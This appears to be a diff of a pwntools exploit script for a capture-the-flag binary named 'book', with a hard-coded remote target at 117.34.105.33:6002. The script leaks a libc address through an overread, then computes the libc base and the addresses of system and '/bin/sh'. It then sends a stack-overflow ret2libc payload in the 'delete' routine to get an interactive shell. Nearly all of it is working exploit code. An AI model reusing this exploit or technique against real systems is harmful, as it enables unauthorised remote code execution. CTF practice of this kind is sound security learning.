@@ -1,42 +1,51 @@
 from pwn import *
-DEBUG=1
+DEBUG = 0
 list = [ ]
+libc = ELF('./libc-2.23.so')
+elf = ELF("./book")
 if DEBUG:
     env = os.environ
-    #nv["LD_PRELOAD"] = os.getcwd() + '/libc-2.23.so'
+    #Ubuntu 16.04
+    env["LD_PRELOAD"] = './libc-2.23.so'
     context.log_level = 'debug'
     p = process("./book")
-
+    #use ROPgadget --binary libcxxx --string "/bin/sh" 
+    binsh_offset = 0x15BA0B
+    system_offset = libc.symbols["system"]
+    #use ida to get
+    leak_offset = -0x1B23DC
 else:
     context.log_level = 'info'
     p = remote("117.34.105.33",6002)
-
-libc = ELF('./libc-2.23.so')
-elf = ELF("./book")
+    binsh_offset = 0x15BA0B
+    system_offset = libc.symbols["system"]
+    leak_offset = -0x1B23DC
 
 #get shell
 def exp():
     p.recvuntil("Who")
+    if DEBUG:
+        pause()
     p.send('a' * 0x14)
     p.recvuntil('a' * 0x14)
     leak_heap_addr=u32(p.recv(4))
     leak_libc_addr=u32(p.recv(4))
-    libc_base = leak_libc_addr - 0x1AA3C4
-    #one_addr = libc_base + 0x3FD27
-    system_addr = elf.symbol['system'] + libc_base 
-    print hex(leak_libc_addr),hex(libc_base),hex(system_addr)
-
-    pause()
+    libc_base = leak_libc_addr + leak_offset
+    system_addr = system_offset + libc_base
+    binsh_addr = binsh_offset + libc_base 
+    print hex(leak_libc_addr),hex(libc_base),hex(system_addr),hex(binsh_addr)
+    if DEBUG:
+        pause()
     p.sendline("delete")
     p.recvuntil("----\n")
     #delete() stack overflow
-    flag_addr = 0x8048870
-    payload = 'a' * 0x1A + p32(one_addr)
+    #Mark:binsh_addr have special char will stop scanf so +5 make "/bin/sh\0" to "sh\0"
+    payload = 'x' * 0x1A + p32(system_addr) + 'a'*4 +  p32(binsh_addr+5) 
     p.sendline(payload)
     p.recvuntil("----\n")
     p.recvuntil("----\n")
-    flag = p.recvuntil("}")
-    print flag
+    p.interactive()
 
 if __name__ == "__main__":
     exp()
+
